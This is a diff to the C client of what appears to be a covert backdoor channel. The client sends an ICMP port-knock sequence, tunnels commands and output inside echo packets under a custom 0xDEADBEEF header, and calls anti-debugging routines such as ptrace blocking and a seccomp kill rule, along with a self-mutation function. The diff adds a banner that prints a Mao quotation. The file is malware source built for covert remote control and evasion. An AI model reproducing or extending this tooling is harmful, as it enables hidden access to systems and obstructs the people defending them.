@@ -11,6 +11,8 @@
 #include <errno.h>
 #include <signal.h>
 #include <time.h>
+#include <wchar.h>
+#include <locale.h>
 #include "includes/anti_debug.h"
 #include "includes/icmp_common.h"
 
@@ -19,11 +21,11 @@
 #define END_MARKER "__END__"
 #define HEADER_IP "127.0.0.1"
 
-extern void anti_debug();                
+extern void anti_debug(void);                
 extern void check_tracer_pid(void);
 extern void block_ptrace_attaches(void);
 extern void install_seccomp_ptrace_kill(void);
-extern int mutate_main(int argc, char **argv);
+extern int mutate_main(void);
 
 #define SEQ_LEN 3
 const char *KNOCK_SEQUENCE[SEQ_LEN] = {
@@ -84,7 +86,7 @@ int send_icmp_echo_with_headers(int sock, const char *dest_ip, const char *paylo
     char *data_ptr = packet + sizeof(struct icmp_header);
     memcpy(data_ptr, &custom_hdr, sizeof(custom_hdr));
     data_ptr += sizeof(custom_hdr);
-
+    
     if (payload_len > 0) {
         memcpy(data_ptr, payload, payload_len);
     }
@@ -137,44 +139,6 @@ int send_icmp_echo(int sock, const char *dest_ip, const char *payload, int paylo
 }
 
 // Receive ICMP echo reply
-/*int recv_icmp_reply(int sock, char *buffer, int buf_size, struct sockaddr_in *src_addr) {
-    char packet_buffer[BUFSIZE];
-    socklen_t addr_len = sizeof(struct sockaddr_in);
-    ssize_t n;
-    
-    while (1) {
-        n = recvfrom(sock, packet_buffer, sizeof(packet_buffer), 0, (struct sockaddr *)src_addr, &addr_len);
-        if (n <= 0) {
-            if (errno == EINTR) continue;
-            return -1;
-        }
-        
-        // Parse IP header
-        struct iphdr *ip_header = (struct iphdr *)packet_buffer;
-        int ip_header_len = ip_header->ihl * 4;
-        
-        if (n < ip_header_len + (int)sizeof(struct icmp_header)) {
-            continue; // Not a complete ICMP packet
-        }
-        
-        struct icmp_header *icmp_hdr = (struct icmp_header *)(packet_buffer + ip_header_len);
-        
-        // Only process echo replies with our PID
-        if (icmp_hdr->type == ICMP_ECHOREPLY && icmp_hdr->un.echo.id == getpid()) {
-            int payload_len = n - ip_header_len - sizeof(struct icmp_header);
-            if (payload_len > buf_size) {
-                payload_len = buf_size;
-            }
-            
-            // Copy only the payload to the output buffer
-            char *payload = (char *)(icmp_hdr + 1);
-            memcpy(buffer, payload, payload_len);
-            return payload_len;
-        }
-    }
-}*/
-
-// Receive ICMP echo reply
 int recv_icmp_reply(int sock, char *buffer, int buf_size, struct sockaddr_in *src_addr) {
     char packet_buffer[BUFSIZE];
     socklen_t addr_len = sizeof(struct sockaddr_in);
@@ -208,7 +172,7 @@ int recv_icmp_reply(int sock, char *buffer, int buf_size, struct sockaddr_in *sr
             char *payload = (char *)(icmp_hdr + 1);
             
             // Check if this is a custom header response and skip it
-            if (payload_len >= (int)sizeof(struct custom_icmp_header)) {
+	    if (payload_len >= (int)sizeof(struct custom_icmp_header)) {
                 struct custom_icmp_header *custom_hdr = (struct custom_icmp_header *)payload;
                 if (ntohl(custom_hdr->magic) == 0xDEADBEEF) {
                     // This is a custom header response, skip it
@@ -223,6 +187,9 @@ int recv_icmp_reply(int sock, char *buffer, int buf_size, struct sockaddr_in *sr
 }
 
 void send_knock_sequence_icmp(const char *ip) {
+    printf("[*] Initiating knock sequence. Please wait.\n");
+    sleep(3);
+    printf("[*] \u262D Political power grows out of the barrel of a gun \u262D\n");
     for (int i = 0; i < SEQ_LEN; i++) {
         int tmp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
         if (tmp_sock < 0) {
@@ -239,8 +206,6 @@ void send_knock_sequence_icmp(const char *ip) {
         close(tmp_sock);
         sleep(INTERVALS[i]);
     }
-    
-    printf("[+] ICMP knock sequence sent.\n");
 }
 
 int main(int argc, char *argv[]) {
@@ -327,14 +292,10 @@ int main(int argc, char *argv[]) {
                 printf("%s", output_buffer);
             } else {
                 printf("%s\n", output_buffer);
-            }
+            } 
         }
-
-        int fake_argc = 1;
-        char *fake_argv[] = { "program_name", NULL };
-        mutate_main(fake_argc, fake_argv);
+        mutate_main();
     }
-
     cleanup();
     return 0;
 }
